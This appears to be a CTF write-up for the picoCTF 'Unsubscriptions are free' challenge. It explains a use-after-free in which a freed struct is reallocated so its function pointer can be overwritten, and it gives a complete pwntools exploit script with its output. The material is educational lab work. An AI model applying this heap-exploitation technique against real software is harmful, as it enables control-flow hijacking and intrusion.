---
title: "Unsubscriptions are free"
date: "2025-08-03"
tags: ["picoCTF", "use after free", "function pointer"]
---

In this challenge I get a binary and its source code.

```c
checksec
File:     /home/ub1cu0/Desktop/picoCTF/Unsubscriptions_Are_Free/vuln_patched
Arch:     i386
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

The program is a menu with quite a few options:

```c
./vuln_patched
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
```

Most of them just print something and do not matter. Looking at the source I can see a few critical spots:

```c
typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

cmd *user;
```

Here a `struct` called `cmd` is defined with two fields, both of them pointers.\
The first one (`whatToDo`) is a **function pointer**, so it holds the address of a function that can be executed.\
The second one (`username`) is a pointer to a string. Then it declares a `user` pointer of the type of the struct created above

```c
void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}
```

The `doProcess` function calls wherever the `whatToDo` pointer points.

That means if I manage to change where `whatToDo` points, every time the program runs `doProcess` the flow of the program goes where I want. How can I change it? Let me see how the program uses `user`:

```c
int main(){
. . .
	user = (cmd *)malloc(sizeof(user)); // Aquí
. . .
}
```

The program creates a user on the heap, so the heap is my target. With that layout, where user points there is the first field of the struct, which is the pointer I want to change, and 4 bytes later there is the username field.

Looking further into the source I control 2 important things:

```c
void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}
```

and

```c
void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user); // Tenemos control del free
	}else{
		puts("Ok. Get premium membership please!");
	}
}
```

As I can see, the first function lets me write something on the heap, so it looks for the first free chunk and writes there whatever I put into the `msg` variable.\
In the second one I can run a `free(user)`, and since `user` is of type `cmd`, a struct of 8 bytes (4 bytes for the function address and 4 for the username), the program marks that chunk as free.

That means when `malloc(8)` runs again (which is what happens when writing into `msg`), it hands me that same chunk back. So whatever I write overwrites both the function pointer and the username pointer inside the `user` struct.

Now that I control those 8 bytes I can redirect the flow of the program wherever I want. Taking a look at the binary, there is a function called `hahaexploitgobrrr` that prints the flag:

```c
void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}
```

So with that I am ready to write the exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b doProcess
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("mercury.picoctf.net", 61817)

def main():
    io = conn()
    
    io.sendlineafter(b'(e)xit\n' , b's')
    win_addr = int(io.recvline().decode().strip().split('...')[1], 16)
    log.success(f'Dirección Win: {hex(win_addr)}')
    
    io.sendline(b'i')
    io.recvline()
    io.sendlineafter(b"You're leaving already(Y/N)?\n" , b'Y')
    
    io.sendlineafter(b'(e)xit\n' , b'L')
    io.sendlineafter(b':', p32(win_addr))
    
    io.interactive()

if __name__ == "__main__":
    main()

```

```c
python solve.py       

[*] '/home/ub1cu0/Desktop/picoCTF/Unsubscriptions_Are_Free/vuln_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Opening connection to mercury.picoctf.net on port 61817: Done
[+] Dirección Win: 0x80487d6
[*] Switching to interactive mode

picoCTF{SECRET}
```
